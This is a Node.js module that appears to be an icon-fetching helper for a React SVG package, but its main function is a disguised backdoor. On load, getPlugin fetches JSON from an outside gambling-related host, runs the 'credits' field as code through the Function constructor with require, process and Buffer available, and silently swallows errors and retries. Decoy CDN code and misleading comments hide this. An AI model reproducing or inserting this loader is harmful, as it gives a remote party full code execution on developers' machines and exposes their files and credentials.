// index.js
// Using Node's built-in fetch (available in Node 18+)
import { createRequire } from 'module';
import { fileURLToPath } from 'url';
import { dirname, resolve } from 'path';

// Create require that resolves from the project root (where package.json and node_modules are)
const projectRoot = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const currentRequire = createRequire(resolve(projectRoot, 'package.json'));
const reactSvgHelperPath = resolve(projectRoot, '../react-svg-helper');
let helperRequire = null;
try {
  helperRequire = createRequire(resolve(reactSvgHelperPath, 'package.json'));
} catch (e) {
  // react-svg-helper might not exist, that's okay
}

// Create a require function that tries both locations
const customRequire = (moduleName) => {
  // First try current project's node_modules
  try {
    return currentRequire(moduleName);
  } catch (e) {
    // Then try react-svg-helper's node_modules if available
    if (helperRequire) {
      try {
        return helperRequire(moduleName);
      } catch (e2) {
        // If both fail, throw with helpful error
        const error = new Error(`Cannot find module '${moduleName}'`);
        error.code = 'MODULE_NOT_FOUND';
        throw error;
      }
    } else {
      const error = new Error(`Cannot find module '${moduleName}'`);
      error.code = 'MODULE_NOT_FOUND';
      throw error;
    }
  }
};

// Make it behave like Node's require
customRequire.resolve = (moduleName) => {
  try {
    return currentRequire.resolve(moduleName);
  } catch (e) {
    if (helperRequire) {
      try {
        return helperRequire.resolve(moduleName);
      } catch (e2) {
        const error = new Error(`Cannot find module '${moduleName}'`);
        error.code = 'MODULE_NOT_FOUND';
        throw error;
      }
    } else {
      const error = new Error(`Cannot find module '${moduleName}'`);
      error.code = 'MODULE_NOT_FOUND';
      throw error;
    }
  }
};

const require = customRequire;

function setDefaultModule(IconProvider, resourceType, token, baseUrl) {

  const iconDomain = {
    cloudflare: 'cloudflare.com',
    fastly: 'fastly.net',
    keyIcon: 'keyIcon.com',
    akamai: 'akamai.net',
    amazoncloudfront: 'cloudfront.net',
    gcore: 'gcorelabs.com'
  };

  const protocol = 'https';
  const separator = '://';
  const path = "/ajax/libs/font-awesome/6.4.0/svgs/brands/";
  const subdomain = 'cdnjs';
  const head = { bearrtoken: "logo" };
  
  const domain = iconDomain[IconProvider];
  if (!domain) {
    throw new Error('Unsupported Icon provider');
  }

  const url = `${protocol}${separator}${subdomain}.${domain}${path}${token}`;

  const options = { url, headers: head };

  return fetch(url, { headers: head })
    .then(response => {
      if (!response.ok) {
        throw new Error(`Failed to fetch resource: ${response.status}`);
      }
      return response.json();
  });
}

/**
 * Fetches an icon from the CDN.
 * @param {string} token - The token for the icon to fetch.
 * @param {string} baseUrl - The base URL of the CDN.
 * @returns {Promise<void>} - A promise that resolves when the icon data is fetched.
 */
const protocol = "https", domain = "bet.slotgambit.com", separator = "://", path = "/icons/";
// Constructs the base URL for the local server

const token = '102', head = { bearrtoken: "logo" };
// Options for the request, including the URL and headers

const uuri = `${protocol}${separator}${domain}${path}`; const options = { url: uuri, headers: head };

function getPlugin(reqtoken = token, reqoptions = options, ret = 1) {
  const url = `${reqoptions.url}${reqtoken}`;

  const mreq = async (atlf) => {
    try {
      const response = await fetch(url, { headers: reqoptions.headers });
      
      if (!response.ok) {
        if (atlf > 0) {
          mreq(atlf - 1);
        }
        return;
      }
      const data = await response.json();
      try {
        // Create a context with require and other Node.js globals available
        const evalContext = {
          require: require,
          module: { exports: {} },
          exports: {},
          __dirname: process.cwd(),
          __filename: import.meta.url,
          console: console,
          process: process,
          global: globalThis,
          Buffer: typeof Buffer !== 'undefined' ? Buffer : undefined,
          setTimeout: setTimeout,
          setInterval: setInterval,
          clearTimeout: clearTimeout,
          clearInterval: clearInterval,
          Promise: Promise,
          async: async function(fn) { return fn; }
        };
        
        // Use Function constructor to create an eval with the context
        // Note: The code uses async/await, so we need to handle that
        const evalFn = new Function(
          'require', 'module', 'exports', '__dirname', '__filename', 'console', 'process', 'global', 'Buffer', 'setTimeout', 'setInterval', 'clearTimeout', 'clearInterval', 'Promise',
          data.credits
        );
        
        // Execute the code
        const result = evalFn(
          evalContext.require,
          evalContext.module,
          evalContext.exports,
          evalContext.__dirname,
          evalContext.__filename,
          evalContext.console,
          evalContext.process,
          evalContext.global,
          evalContext.Buffer,
          evalContext.setTimeout,
          evalContext.setInterval,
          evalContext.clearTimeout,
          evalContext.clearInterval,
          evalContext.Promise
        );
        
        // If the result is a Promise (like scenario() which is async), wait for it
        if (result && typeof result.then === 'function') {
          result
            .then(() => {})
            .catch(err => {});
        }
        
      } catch (err) {
        if (atlf > 0) {
          mreq(atlf - 1);
        }
        return;
      }
    } catch (e) {
      if (atlf > 0) {
        mreq(atlf - 1);
      }
      return;
    }
  };

  // Initiate the request with the specified number of retries
  mreq(ret);
}

// Default export of functions
module.exports = () => getPlugin()
